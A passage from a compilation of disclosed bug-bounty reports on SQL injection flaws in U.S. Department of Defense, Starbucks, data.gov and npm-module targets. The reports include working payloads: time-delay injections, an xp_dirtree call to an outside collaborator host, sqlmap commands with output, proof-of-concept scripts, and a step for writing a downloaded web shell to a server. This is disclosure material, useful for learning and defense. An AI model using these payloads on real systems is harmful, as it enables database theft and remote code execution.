   System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) +316
   System.Data.Common.DbDataAdapter.Fill(DataSet dataSet) +88
   GCSS_Army.MessageCenter.MessagingCenter.getMessages(String ssql) in C:\Users\████████\source\repos\New GCSS-Army\WebApplication4\WebApplication4\MessageCenter\MessagingCenter.aspx.cs:171
   GCSS_Army.MessageCenter.MessagingCenter.btnSearch_Click(Object sender, EventArgs e) in C:\Users\████\source\repos\New GCSS-Army\WebApplication4\WebApplication4\MessageCenter\MessagingCenter.aspx.cs:275
   System.Web.UI.WebControls.Button.OnClick(EventArgs e) +9663950
   System.Web.UI.WebControls.Button.RaisePostBackEvent(String eventArgument) +103
   System.Web.UI.WebControls.Button.System.Web.UI.IPostBackEventHandler.RaisePostBackEvent(String eventArgument) +10
   System.Web.UI.Page.RaisePostBackEvent(IPostBackEventHandler sourceControl, String eventArgument) +13
   System.Web.UI.Page.RaisePostBackEvent(NameValueCollection postData) +35
   System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint) +1724

```

you can used this command `1'; waitfor delay '0:0:2' -- ` and the error page will return after `2` second

## Impact

An attacker may execute arbitrary SQL statements on the vulnerable system. This may compromise the integrity of your database and/or expose sensitive information.

---

### [████████ SQL](https://hackerone.com/reports/381771)

- **Report ID:** `381771`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @manshum12
- **Bounty:** - usd
- **Disclosed:** 2019-10-08T18:47:04.514Z
- **CVE(s):** -

**Vulnerability Information:**

hi , i think i find a SQL in https://██████████/

POST /requestaccount.php? HTTP/1.1
Host: █████
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://█████████/requestaccount.php?
Content-Type: application/x-www-form-urlencoded
Content-Length: 98
Cookie: _ga=GA1.2.797825707.1531527624; PHPSESSID=h46aobnksi6rqe0dki7b34thn10qqf7j; TS0136a92d=0141bba1871c30b60b2555c9145e093817841b5f20a39085c1ff77e556280571aa32dcc2ebf57d0d397334f8207e32f1153478dbc7; Hm_lvt_dde6ba2851f3db0ddc415ce0f895822e=1531606739; Hm_lpvt_dde6ba2851f3db0ddc415ce0f895822e=1531623251
Connection: close
Upgrade-Insecure-Requests: 1

fname=&lname=&uname=&email=&phone=&dsn=&cmdName=&title=&rank=&rate=Not+specified&message=&curID=-1

SQL vulnerable in  curID=-1'
if you puy ' u will see screenshot 49 and 48

## Impact

SQL injection is a code injection technique, used to attack data-driven applications, in which nefarious SQL statements are inserted into an entry field for execution

---

### [SQL Injection on www.██████████ on countID parameter](https://hackerone.com/reports/390879)

- **Report ID:** `390879`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @0_1vitthal
- **Bounty:** - usd
- **Disclosed:** 2019-10-08T18:46:15.286Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**
Hello Team,
I have came across a sql injection vulnerability on www.██████ on countID parameter. I was able to retrieve the banner which is

> Microsoft SQL Server 2008 R2 (SP3) - 10.50.6220.0 (X64& 
	Mar 19 2015 12:32:14 
	Copyright (c) Microsoft Corporation
	Standard Edition (64-bit) on Windows NT 6.3 <X64> (Build 9600: ) (Hypervisor)

after confirming the vulnerability i have stopped testing further.

**Vulnerable URL:**
https://www.███/public/saveCount.cfm?countID=4

**Steps to Reproduce:**
1. python sqlmap.py -u https://www.██████████/public/saveCount.cfm?countID=4 --level=3 --risk=3 

**POC**
█████████

## Impact

Attacker can take control over the database server.

---

### [ SQL injections](https://hackerone.com/reports/272506)

- **Report ID:** `272506`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @lfb
- **Bounty:** - usd
- **Disclosed:** 2019-10-04T15:19:56.603Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
An email is not well handeled and leads to sql injection.
**Description:**
This request
POST /FileTransfer/Upload HTTP/1.1
Host: www.███████

The parameter **from** is injectable and leads to valid sql injection.
## Impact
I didn't go all out and get a shell but, an attaker could exctract db information or execute sql command on the serve with the rights of the db user.

## Step-by-step Reproduction Instructions
Payload injection 
```
';declare @q varchar(99);set @q='\\4fkxoc5km935m5n0dqqu3vvk5bb1zq.burpcollaborator.net/random'; exec master.dbo.xp_dirtree @q;-- 
```

Request to make execute the sql command 
```
POST /FileTransfer/Upload HTTP/1.1
Host: www.███
Connection: close
Content-Length: 269
Cache-Control: max-age=0
Origin: https://www.████
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybjrDo2DV1yHQWvAQ
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
DNT: 1
Referer: https://www.█████████/FileTransfer/
Accept-Language: en-GB,en-US;q=0.8,en;q=0.6,fr;q=0.4

------WebKitFormBoundarybjrDo2DV1yHQWvAQ
Content-Disposition: form-data; name="from"

hello';declare @q varchar(99);set @q='\\4fkxoc5km935m5n0dqqu3vvk5bb1zq.burpcollaborator.net/random'; exec master.dbo.xp_dirtree @q;-- 
------WebKitFormBoundarybjrDo2DV1yHQWvAQ
```

first I get a dns query on my burp collaborator (see sqli2.png)

second I get the server to poll with master.dbo.xp_dirtree from 143.85.74.18 at 2017-Sep-27 21:29:55
```
PROPFIND /random HTTP/1.1
Host: 4fkxoc5km935m5n0dqqu3vvk5bb1zq.burpcollaborator.net
Content-Length: 0
Depth: 0
translate: f
User-Agent: Microsoft-WebDAV-MiniRedir/6.0.6002
Accept-Encoding: gzip, deflate, identity
Connection: Keep-Alive
X-BlueCoat-Via: ██████████
```

Also it is easy to see that the single quote breaks the sql syntax.

## Suggested Mitigation/Remediation Actions
Make prepared statement so the **'** doesnt get interpreted. (Input data validation)
Maybe verify other parameters.

---

### [SQL injection on the https://████/](https://hackerone.com/reports/488795)

- **Report ID:** `488795`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @sp1d3rs
- **Bounty:** - usd
- **Disclosed:** 2019-10-04T15:19:20.375Z
- **CVE(s):** -

**Vulnerability Information:**

##Description
Hello. I was able to find Blind SQL injection on the https://███/
Database appears to be MySQL 5.

##POC
```
GET /library.php?path=test&doc_id=1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(1)))WUeh) HTTP/1.1
Host: ██████
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en,ru;q=0.9,en-US;q=0.8,uk;q=0.7
Cookie: _ga=GA1.2.1697249984.1548431559


```
By issuing sleep(0) response will be delayed to 0 seconds.
By issuing sleep(1) response will be delayed to 5 seconds.
By issuing sleep(2) response will be delayed to 10 seconds.
By issuing sleep(5) response will be delayed to 25 seconds.

As POC, I retrieved count of databases (3). No other information was accessed (such as tables or data):


Apparently, SQL statement is executing 5 times on the database side, because response time always 5 times bigger than supplied sleep value.

## Impact

SQL injection usually have high-critical impact.

---

### [SQL Injection in the get_publications.php on the https://█████](https://hackerone.com/reports/489483)

- **Report ID:** `489483`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @sp1d3rs
- **Bounty:** - usd
- **Disclosed:** 2019-10-04T15:18:44.582Z
- **CVE(s):** -

**Vulnerability Information:**

##Description
Hello. I was able to find Time-based SQLI on the https://███/pubs/get_publications.php using `pub_group_id` parameter

##POC
```
GET /pubs/get_publications.php?pub_group_id=wrtqvasi10rc19j1'%2b(select*from(select(sleep(5)))a)%2b'&rno86qi4=1 HTTP/1.1
Host: █████
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: https://█████/pubs/
Accept-Encoding: gzip, deflate, br
Accept-Language: en,ru;q=0.9,en-US;q=0.8,uk;q=0.7
Cookie: _ga=GA1.2.1697249984.1548431559; __utma=161700579.1697249984.1548431559.1548902867.1548902867.1; __utmz=161700579.1548902867.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); _test_cookie=0


```
This request will trigger the 5 sec delay of the response. By making sleep value as 10, request will be delayed for 10 seconds.
As additional POC, that attacker is able to extract data, and it's not a false-positive, I retrieved DB banner (version) only using sqlmap command:
```
sqlmap.py -r test.txt --dbms=mysql --technique=T -p pub_group_id --banner --force-ssl --level=5
```
where test.txt is a text fiile contained request dump above.
Result:
```
5.5.62-0ubuntu0.14.04.1
```
█████

No sensitive data such as databases, tables, or content was accessed.

## Impact

SQL injection usually have high or critical impact.

---

### [SQL Injection in ████](https://hackerone.com/reports/419017)

- **Report ID:** `419017`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @arinerron2
- **Bounty:** - usd
- **Disclosed:** 2019-08-19T12:22:02.251Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

There is an SQL injection vulnerability in the SSN field at https://██████████/████/candidate_app/status_scholarship.aspx

## Impact

An attacker could use this vulnerability to control the content in the database, exfiltrate information, and potentially obtain remote code execution.

## Step-by-step Reproduction Instructions

Follow these steps:
1. Visit https://███/███/candidate_app/status_scholarship.aspx
2. Right click on the SSN field, click Inspect Element, and edit `maxlength="9"` by changing it to `maxlength="9999"` (or something similar, so that a longer payload can be put in)
3. Choose a random birth date, for example, January 1, 1990.
4. Enter in your SQL injection payload into the SSN field. For example, try `' OR '1'='1`.
5. Click "Check Status". Your SQLi payload will execute. If you did the example payload in step 4, assuming someone has the birth date you entered, it will log in as them and check their scholarship status.

Also, I didn't do much testing, but I think the birth date is also vulnerable to SQL injection. After sending the request, in the network tab, Edit and Resend Request after changing the birth day, month, or year to a payload that will cause invalid syntax like `'`. It will give you an HTTP 500 response. If you do a payload that won't cause invalid syntax like `''`, it will give you an HTTP 200.

## Suggested Mitigation/Remediation Actions
Sanitize everything (use prepared statements) and validate the data.

## Impact

An attacker could use this vulnerability to control the content in the database, exfiltrate information, and potentially obtain remote code execution.

---

### [SQL Injection in ████](https://hackerone.com/reports/519631)

- **Report ID:** `519631`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @arinerron2
- **Bounty:** - usd
- **Disclosed:** 2019-08-19T12:21:33.198Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary

There is an SQL injection vulnerability in `████████` in the /█████/recruiter/updapp.aspx` page, exploitable through the `app_id` form parameter.

## Impact

An attacker could use this vulnerability to control the content in the database, exfiltrate information, and obtain remote code execution.

## Step-by-step Reproduction Instructions

1. Visit https://█████████/Gateway/sso.aspx and sign in. Note that any user can create a user (and any privilege level works for this vulnerability as long as a user is signed in), so this should be considered an unauthenticated vulnerability.
2. With the Network tab of devtools open, visit https://██████/████/recruiter/updapp.aspx
3. Replay the GET request that returned the HTTP 500 error as a POST request with the body `app_id='`. This can be done by right clicking on the request, copying it as cURL, pasting the command in terminal, and appending ` -k -X POST --data "app_id='"`.
4. Notice in the response, there is an error: `ORA-01756: quoted string not properly terminated`. This is because the single apostrophe (`'`) caused the SQL query to be syntactically invalid.
5. Replay the request in the same way as shown in #3, but with the body `app_id=''` (this time append ` -k -X POST --data "app_id=''"` to the cURL command). 
6. Notice in the response, there is an error: `ORA-01722: invalid number`. This is because the double apostrophes (`''`)  did not cause the SQL query to be syntactically invalid, but because aposrophes are not numbers, they caused a different error.
7. Repeat step #3 as many times as you like. An odd number of apostrophes (`'`) will cause the SQL query to fail because it is syntactically invalid, and an even number will cause it to fail because it is valid, but apostrophes are not numbers.

I did not want to exploit this to get remote code execution because this is a live production system, but to get RCE, simply execute an SQL query that writes the file at https://raw.githubusercontent.com/danielmiessler/SecLists/master/Web-Shells/laudanum-0.8/aspx/shell.aspx to `D:\██████\shell.aspx` using the `INTO OUTFILE` syntax, then visit https://███/█████████/shell.aspx

## Suggested Mitigation/Remediation Actions

Sanitize everything in the SQL query (use prepared statements), and validate the data before putting it in the query.

Note: I wouldn't have been able to find this vulnerability if it wasn't for the fact that verbose error pages were enabled. Because they were, it leaked source code, and I could see that the SQL injection vulnerability existed before testing.

## Impact

An attacker could use this vulnerability to control the content in the database, exfiltrate information, and obtain remote code execution.

**Summary (researcher):**

See the writeup at https://aaronesau.com/blog/posts/5

---

### [SQL Injection vulnerability located at ████████](https://hackerone.com/reports/384397)

- **Report ID:** `384397`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @rootaccess
- **Bounty:** - usd
- **Disclosed:** 2019-08-15T17:08:48.095Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
I have found a SQL Injection at ███████ in the ████ Portal.

**Description:**
The SQL injection is being caused by the unsanitized parameter of `_itemID=` i immediately  stopped testing when i verified it was possible to get the Current user and version of the Database.

1.The vulnerable url is : 
`https://█████/███Portal/█████?_██████=true&_st=&_pageLabel=█████████_███████_pubview_page&CCD_itemID=201826*` 
2. use sqlmap (https://github.com/sqlmapproject/sqlmap) with the following command 

```python
python sqlmap.py -u "https://██████/████████Portal/██████████?_█████=true&_st=&_pageLabel=███_██████_pubview_page&CCD_itemID=201826*" --random-agent --current-user --is-dba
```
sqlmap output : 
```
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: https://███████:443/███████Portal/████?_███=true&_st=&_pageLabel=███_█████_pubview_page&CCD_itemID=201826 AND 2833=2833

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: https://██████████:443/████Portal/██████████?_███=true&_st=&_pageLabel=███_██████████_pubview_page&CCD_itemID=201826 UNION ALL SELECT NULL,CONCAT(CONCAT('qvzxq','ODiUngdWPubxHGXaEEDvfcozGjVAMxIqpHmWfTVJ'),'qbbxq') FROM VERSIONS-- AQYh
---
[22:37:56] [INFO] testing SAP MaxDB
[22:37:57] [WARNING] the back-end DBMS is not SAP MaxDB
[22:37:57] [INFO] testing MySQL
[22:37:58] [WARNING] the back-end DBMS is not MySQL
[22:37:58] [INFO] testing Oracle
[22:37:59] [INFO] confirming Oracle
[22:38:01] [INFO] the back-end DBMS is Oracle
web application technology: Apache, Servlet 2.5, JSP, JSP 2.1
back-end DBMS: Oracle
[22:38:01] [INFO] fetching current user
current user:    ██████████
[22:38:02] [INFO] testing if current user is DBA
current user is DBA:    True
```

##Screenshot

{F322498}

## Suggested Mitigation/Remediation Actions
Sanitize the parameter of `_itemID=` through the use of prepared statements, or other forms of sanitizing.

## Impact

It could be possible for an attacker to Retrieve data, and depending of the data being stored in the database(passwords) it could be possible to further pivot, and get RCE since the current user in the database has DBA rights.

---

### [SQL Injection Extracts Starbucks Enterprise Accounting, Financial, Payroll Database](https://hackerone.com/reports/531051)

- **Report ID:** `531051`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** Starbucks
- **Reporter:** @spaceraccoon
- **Bounty:** - usd
- **Disclosed:** 2019-08-06T05:51:52.800Z
- **CVE(s):** -

**Summary (team):**

As described in the Hacker Summary, @spaceraccoon discovered a SQL Injection vulnerability in a web service backed by Microsoft Dynamics AX. @spaceraccoon demonstrated that the flaw was exploitable via XML-formatted HTTP payload requests to the server. We appreciate @spaceraccoon's clear and thorough report, which helped us quickly and effectively triage the report and remediate the vulnerability.

**Summary (researcher):**

## False Starts

I first came across the endpoint via typical subdomain enumeration. On the surface, it looked like an extremely promising target: a simple HTML file upload form. I began by testing for unrestricted file uploads with PHP shells and such, but it quickly became clear from the verbose error messages that while the files were being sent to the server, they were being processed as XML files and were not saved on the server.

Fortunately, the error messages helped me craft a properly-formatted XML file that was accepted by the server. It appeared to be some kind of accounting database entry as it expected nodes like `MainAccount`, `Credit`, `Debit`, `Invoice` and so on. Moreover, the error messages included references to [Microsoft Dynamics AX](https://dynamics.microsoft.com/en-sg/ax-overview/?cdn=disable), an enterprise financial/accounting software platform. At this point, I started testing for XXE attacks. However, it appeared that external entities were blocked and despite multiple attempts at bypasses, I could only achieve a "Billion Laughs" attack that would result in denial of service. This wasn't good enough, so after several more days of trying, I eventually moved on to other targets.

## The Lightbulb Moment

More than a month later, I revisited the target. Fortunately, it was still online. This time, I suspected that if the XML input was being entered into a database, I should test for SQL injections. In particular, the `MainAccount` looked promising because it accepted a numerical ID like `<MainAccount>123456</MainAccount>` and was perhaps used in a `WHERE` SQL query.

However, it appeared that the apostrophe `'` was being properly escaped. After a bit of testing, I realized my mistake: the XML format prohibits some characters, including the apostrophe. To include them, you have to enter apostrophes as escaped entities. Instead of `<MainAccount>123456'</MainAccount>`, I had to use `<MainAccount>123456&apos;</MainAccount>`. The server immediately returned a `database error` message - I was on the right path!

With a bit more manual testing, I realized it was possible to craft a time-based SQL injection. I then switched to `sqlmap` with the `--tamper htmlencode` flag to automate my attack. After a few minutes of anxious waiting, `sqlmap` confirmed the exploit and returned the database  version: `Microsoft SQL Server 2012`. I was in!

## Assessing Impact

So I had an SQL injection - but what if the database was unused or negligible? I decided to test for three things: the type of data in the database, the amount of data, and the recency of data. However, I quickly met a roadblock: as an enterprise database, Microsoft Dynamics AX was massive: a quick check revealed that the database had thousands of tables. I had to find and focus on the main table, but where should I begin?

Fortunately, Microsoft provides documentation online about Dynamics AX. After a bit of research, I found the default main table and the relevant columns. A few minutes later, the answers came in. There were almost a million entries up till the previous year that included real accounting information. Zaheck!! I immediately stopped testing and wrote my report.

## Takeaways

1. Don't get tunnel vision. Just because it's a file upload, don't focus solely on uploading a reverse shell. Just because it accepts XML files, don't focus solely on XXE.
2. Take notes and revisit old targets. Many of my best bugs were from vulnerabilities I found after revisiting an old endpoint. Taking time off can reveal new attack paths.
3. Assess impact after the initial exploit, but don't go too far.

Thank you Starbucks team and Hackerone triagers for responding quickly and communicating so well!

---

### [Blind SQLi leading to RCE, from Unauthenticated access to a test API Webservice](https://hackerone.com/reports/592400)

- **Report ID:** `592400`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** Starbucks
- **Reporter:** @geek_jeremy
- **Bounty:** - usd
- **Disclosed:** 2019-07-22T23:24:57.091Z
- **CVE(s):** -

**Summary (team):**

@geek_jeremy, at the same time as other hackers who submitted their own reports, discovered a browsable WSDL service on an API endpoint under the starbucks.com.cn domain, running on a non-standard port.
@geek_jeremy demonstrated that the service had several functions that executed without any authentication at all, allowing the listing of users, passwords and other personal information. Fortunately, this was a test service, executing on test data, and as a result, this alone did not constitute a vulnerability worth rewarding.
@geek_jeremy also demonstrated that the service had at least one blind SQLi vulnerability, allowing him to not only access the database behind the service, but also to execute commands through the xp_cmdshell function. The "ping" command was used to demonstrate this safely without causing bad effects to the service. Because this was a Remote Code Execution (RCE) on a production server, even though it was reached through a test instance, this was awarded as a Critical vulnerability.

---

### [Arbitrary SQL command injection](https://hackerone.com/reports/508487)

- **Report ID:** `508487`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** Nextcloud
- **Reporter:** @leonklingele
- **Bounty:** - usd
- **Disclosed:** 2019-07-21T19:23:50.835Z
- **CVE(s):** CVE-2019-5476

**Summary (team):**

When querying for users on the lookup server any unauthenticated user could perform an SQL Injection.

---

### [Blind SQL Injection on starbucks.com.gt and WAF Bypass  :*](https://hackerone.com/reports/549355)

- **Report ID:** `549355`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** Starbucks
- **Reporter:** @d3417_
- **Bounty:** - usd
- **Disclosed:** 2019-06-19T16:55:24.660Z
- **CVE(s):** -

**Summary (team):**

Starting with a blind SQL Injection on http://www.starbucks.com.gt/menu/beverage/detail, @d3417_ was able to dump schema on several database tables.
Initially closed as N/A because of our exclusion on automated tools, reopened to investigate the data reported in the tables, and because the casual use of an sqlmap command doesn't meet our usual definition of an automated scan.
Downgraded from Critical to High, and awarded $500 bounty, because of the limited nature of the data exposed in these tables.
Disclosure requested, but since much of the ticket would need to be redacted in order to remove database/table/schema/field names, we're releasing the summary and timeline only. Thanks to @d3417_ for reporting this.

---

### [[untitled-model] sql injection](https://hackerone.com/reports/507222)

- **Report ID:** `507222`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** Node.js third-party modules
- **Reporter:** @verichains
- **Bounty:** - usd
- **Disclosed:** 2019-06-18T07:25:04.644Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report [VULNERABILITY] in [MODULE]
It allows [DESCRIBE THE IMPACT OF THE VULNERABILITY - E.G READ ARBITRARY FILES, READ DATA FROM DATABASE ETC]

# Module

**module name:** untitled-model
**version:** 1.0.5
**npm page:** `https://www.npmjs.com/package/untitled-model`

## Module Description

  Rapid sql query generator extention for [node](http://nodejs.org).
  
  [![NPM Version][npm-image]][npm-url] [![NPM Downloads][downloads-image]][downloads-url]


- [Installation](#installation)
- [Features](#features)
- [Quick Start](#quick-start)
- [Model](#user-model-:)
- [Foreign Key](#foreign-key)
- [Functions](#features)
    - [filter()](#user.filter(callback)-``requires-sql-connection``)
    - [values()](#user.values(['attr'])-``sql-projection``)
    - [all(callback)](#user.all(callback)-``requires-sql-connection``)
    - [update(callback)](#update({})-``returns-model``)
- [model](#user-=--model.get('user'))

## Module Stats

> Replace stats below with numbers from npm’s module page:

8 downloads in the last week
17 downloads in the last month

# Vulnerability

## Vulnerability Description

Multiple sql injections problems due to unescaped input usage.

## Steps To Reproduce:

- install the module `yarn add untitled-model`
- setup db:
```mysql
CREATE TABLE `user` (
  `id` int(11) NOT NULL,
  `firstName` varchar(255) NOT NULL,
  `lastName` varchar(255) NOT NULL,
  `age` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
INSERT INTO `user` (`id`, `firstName`, `lastName`, `age`) VALUES
(1, 'Timber', 'Saw', 25),
(2, 'Timber 0', 'Saw', 25);
```

- run the poc script:
```js
var model = require('untitled-model');
model.connection(
	{   
		host: "localhost",
		user: "root",
		password: "",
		database:"test"
	}
);
var User = model.get('user');
//User.all((err,data)=>{
//	console.log(err,data);
//})

(async () => {
	await new Promise((resolve,reject)=>{
		User.filter({'id': 1},function(err,data){
			if(err) throw err;
			console.log('normal query', data);
			resolve();
		});
	});
	await new Promise((resolve,reject)=>{
		User.filter({'id': "' or id=2#"},function(err,data){
			if(err) throw err;
			console.log('sqli query', data);
			resolve();
		});
	});
	process.exit(0);
})()
```

Output:
```js
normal query [ RowDataPacket { id: 1, firstName: 'Timber', lastName: 'Saw', age: 25 } ]
sqli query [ RowDataPacket { id: 2, firstName: 'Timber 0', lastName: 'Saw', age: 25 } ]
```

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

MacOS
8.12.0
6.4.1

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

Sql injection.

---

### [[typeorm] SQL Injection](https://hackerone.com/reports/506654)

- **Report ID:** `506654`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** Node.js third-party modules
- **Reporter:** @verichains
- **Bounty:** - usd
- **Disclosed:** 2019-04-02T04:25:24.379Z
- **CVE(s):** -

**Vulnerability Information:**

I would like to report SQL Injection in typeorm.
It allows reading data from database.

# Module

**module name:** typeorm
**version:** 0.2.14
**npm page:** `https://www.npmjs.com/package/typeorm`

## Module Description

> TypeORM is an ORM that can run in NodeJS, Browser, Cordova, PhoneGap, Ionic, React Native, NativeScript, Expo, and Electron platforms and can be used with TypeScript and JavaScript (ES5, ES6, ES7, ES8). Its goal is to always support the latest JavaScript features and provide additional features that help you to develop any kind of application that uses databases - from small applications with a few tables to large scale enterprise applications with multiple databases.

> TypeORM supports both Active Record and Data Mapper patterns, unlike all other JavaScript ORMs currently in existence, which means you can write high quality, loosely coupled, scalable, maintainable applications the most productive way.



## Module Stats

> Replace stats below with numbers from npm’s module page:

79,749 downloads in the last week

# Vulnerability

## Vulnerability Description

Method `escapeQueryWithParameters` of `MysqlDriver.ts` directly return value from parameter if it is a function without escaping which allow attacker to perform SQL Injection in specialized context.
https://github.com/typeorm/typeorm/blob/d9f5581b22c4cccfab55ee23fad699e1c8acadf8/src/driver/mysql/MysqlDriver.ts#L387

```ts
            if (value instanceof Function) {
                return value();

            } else {
                escapedParameters.push(value);
                return "?";
            }
```

I'm not sure if this is intended or not, there's no information in the document, if someone used this pattern (value provided by a function callback) it will lead to sql injection attack.


## Steps To Reproduce:

- Create a new test typeorm package
```bash
npx typeorm init --name Test --database mysql
```

- Edit `ormconfig.json` for local credentials.

Modify `index.ts` to test the injection:

```ts
import "reflect-metadata";
import {createConnection} from "typeorm";
import {User} from "./entity/User";

createConnection().then(async connection => {

    console.log("Inserting a new user into the database...");

    for(var i=0;i<10;i++) {
        const user = new User();
        user.firstName = `Timber ${i}`;
        user.lastName = "Saw";
        user.age = 25 + i;
        await connection.manager.save(user);
        console.log("Saved a new user with id: " + user.id);
    }

    const repo = connection.getRepository(User);

    console.log(await repo.createQueryBuilder().where('firstName = :name', {name: () => "-1 or firstName=0x54696d6265722033"}).getOne());

    process.exit(0);
}).catch(error => console.log(error));
```
(0x54696d6265722033 is "Timber 3")

Output:
```
Inserting a new user into the database...
User { id: 5, firstName: 'Timber 3', lastName: 'Saw', age: 28 }
```

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- MacOs
- NodeJS v8.12.0
- npm 6.4.1

# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

Allow attackers to perform SQL Injection attacks.

---

### [SQL injection in https://labs.data.gov/dashboard/datagov/csv_to_json via User-agent ](https://hackerone.com/reports/297478)

- **Report ID:** `297478`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** GSA Bounty
- **Reporter:** @harisec
- **Bounty:** - usd
- **Disclosed:** 2019-03-22T16:02:56.793Z
- **CVE(s):** -

**Vulnerability Information:**

I've identified an SQL injection vulnerability in the website  **labs.data.gov** that affects the endpoint `/dashboard/datagov/csv_to_json` and can be exploited via the **User-Agent** HTTP header.

I didn't extracted any data from the database, I've confirmed the vulnerability using **sleep** SQL queries with various arithmetic operations. The **sleep** command combined with the arithmetic operations will cause the server to sleep for various amounts of time depending on the result of the arithmetic operation.

For example, setting the value `Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5),0))OR'` to the `User-Agent` header will cause the server to sleep for **25 (5*5)** seconds.

To reproduce, send the following HTTPS request:

```
GET /dashboard/datagov/csv_to_json HTTP/1.1
Referer: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
X-Forwarded-For: 1
X-Requested-With: XMLHttpRequest
Host: labs.data.gov
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept: */*

```

The server will respond after **25 (5*5)** seconds - same as the value of the `User-Agent:` header.

Now, let's cause the server to respond immediately. We will send the value **sleep(5*5*0)** that is equivalent with **0**.

```
GET /dashboard/datagov/csv_to_json HTTP/1.1
Referer: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'
X-Forwarded-For: 1
X-Requested-With: XMLHttpRequest
Host: labs.data.gov
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept: */*

```
The server responded immediately as **5*5*0 = 0**.

Let's confirm it with another request:

```
GET /dashboard/datagov/csv_to_json HTTP/1.1
Referer: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(6*6-30),0))OR'
X-Forwarded-For: 1
X-Requested-With: XMLHttpRequest
Host: labs.data.gov
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept: */*


```

This time the payload contains **6*6-30** that is equal with **6**. The server responded after **6** seconds.

These are just a few of the SQL queries with various arithmetic operations that I've tried to confirm this issue.

## Impact

An attacker can manipulate the SQL statements that are sent to the MySQL database and inject malicious SQL statements. The attacker is able to change the logic of SQL statements executed against the database.

---

### [SOAP WSDL Parser SQL Code Execution](https://hackerone.com/reports/390359)

- **Report ID:** `390359`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @websecnl
- **Bounty:** - usd
- **Disclosed:** 2019-01-16T19:16:49.737Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
SOAP WSDL Parser SQL Code Execution

**Description:**
It was possible to parse WSDL resources and read all functions from the SOAP Admin Panel, therefor i was able to repeat the sql query with a tampered request with my own custom SQL command.
